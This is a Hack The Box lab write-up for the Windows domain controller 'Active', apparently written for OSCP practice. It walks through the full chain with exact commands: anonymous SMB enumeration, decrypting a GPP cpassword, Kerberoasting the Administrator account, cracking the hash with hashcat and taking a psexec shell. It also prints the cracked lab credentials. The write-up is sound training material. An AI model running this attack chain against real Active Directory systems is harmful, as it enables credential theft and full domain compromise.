# HTB - Active

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078d4?style=flat-square&logo=windows)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![AD](https://img.shields.io/badge/Category-Active%20Directory-blueviolet?style=flat-square)

> A Windows Server 2008 Domain Controller exposing GPP credentials via anonymous SMB access to a Replication share, leading to Kerberoasting the Administrator account directly for a full domain compromise.

---

## Summary

Active is a Windows Server 2008 R2 Domain Controller with no web application and no WinRM. Anonymous SMB access to the Replication share exposes a `Groups.xml` file containing a GPP-encrypted password. `gpp-decrypt` instantly decrypts it to reveal credentials for `SVC_TGS`. With valid domain credentials, Kerberoasting via `GetUserSPNs` finds the Administrator account has an SPN registered. The resulting TGS hash cracks offline in seconds. A psexec shell lands as Administrator and the box is rooted.

---

## Attack Path

```
Nmap → DC identified (Windows Server 2008 R2, no WinRM)
  ↓
SMB anonymous login → Replication share accessible
  ↓
Groups.xml found in GPP Policies folder
  ↓
gpp-decrypt → GPPstillStandingStrong2k18 (SVC_TGS)
  ↓
SMB as SVC_TGS → Users share → user flag
  ↓
Kerberoasting (GetUserSPNs) → Administrator SPN → TGS hash
  ↓
Hashcat mode 13100 → Ticketmaster1968
  ↓
impacket-psexec → Administrator shell [ROOT FLAG]
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV --min-rate 1000 -oA active 10.129.17.124
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb)
445/tcp  open  microsoft-ds?
```

No port 5985 (WinRM) and no port 80. The attack surface is entirely SMB and Kerberos. OS is Windows Server 2008 R2 SP1 — an older version with known legacy misconfigurations.

### SMB Anonymous Enumeration

```bash
smbclient -L //10.129.17.124 -N
```

Anonymous login succeeds. The `Replication` share is non-standard and immediately suspicious.

### Groups.xml Discovery

```bash
smbclient //10.129.17.124/Replication -N
recurse ON
ls
```

Found: `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`

Downloaded:

```bash
smbclient //10.129.17.124/Replication -N -c "cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups; get Groups.xml"
```

**Groups.xml contents:**
```xml
<Groups><User name="active.htb\SVC_TGS">
  <Properties cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
  userName="active.htb\SVC_TGS"/>
</User></Groups>
```

---

## Exploitation

### GPP Password Decryption

Microsoft published the AES-256 key used to encrypt GPP passwords in 2012. Every cpassword value is trivially decryptable.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

**Credentials:** `SVC_TGS : GPPstillStandingStrong2k18`

### User Flag

```bash
smbclient //10.129.17.124/Users -U "active.htb\SVC_TGS%GPPstillStandingStrong2k18" -c "cd SVC_TGS\Desktop; get user.txt"
```

**User flag captured.**

---

## Privilege Escalation

### Kerberoasting

With valid domain credentials, any authenticated user can request TGS tickets for accounts with SPNs registered. The ticket is encrypted with the service account's password hash and can be cracked offline.

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.17.124 -request
```

The Administrator account has `active/CIFS:445` registered as an SPN. A TGS hash is returned.

### Hash Cracking

```bash
hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt --force
```

Cracked in 4 seconds. **Credentials:** `Administrator : Ticketmaster1968`

### Shell via psexec

WinRM is unavailable so psexec is used over SMB:

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.17.124
```

**Root flag captured.**

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| Anonymous SMB access | Replication share | Unauthenticated file access |
| GPP credentials in SYSVOL | Groups.xml | Plaintext credential exposure |
| SPN on Administrator account | Kerberos | Offline TGS hash crack |
| Weak Administrator password | Kerberos ticket | Full domain compromise |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning |
| smbclient | SMB enumeration and file download |
| gpp-decrypt | GPP cpassword decryption |
| impacket-GetUserSPNs | Kerberoasting |
| hashcat | Hash cracking (mode 13100) |
| impacket-psexec | Remote shell via SMB |

---

## Key Takeaways

- No WinRM and no web app means SMB is the entire attack surface. Go there first
- Anonymous SMB access on older Windows environments is common. Always test it before assuming credentials are needed
- Groups.xml with a cpassword field is an instant win. gpp-decrypt takes one second
- Kerberoasting requires valid credentials but no elevated privileges. Any domain user can do it
- An SPN on the Administrator account is a critical misconfiguration. Always Kerberoast every SPN you find
- Hashcat mode 13100 for Kerberoast, mode 18200 for AS-REP Roast. Know the difference
- psexec is your shell when WinRM is unavailable. Requires Administrator-level SMB access

---

*Part of my OSCP preparation journey. Repo: [github.com/mavhezha](https://github.com/mavhezha)*
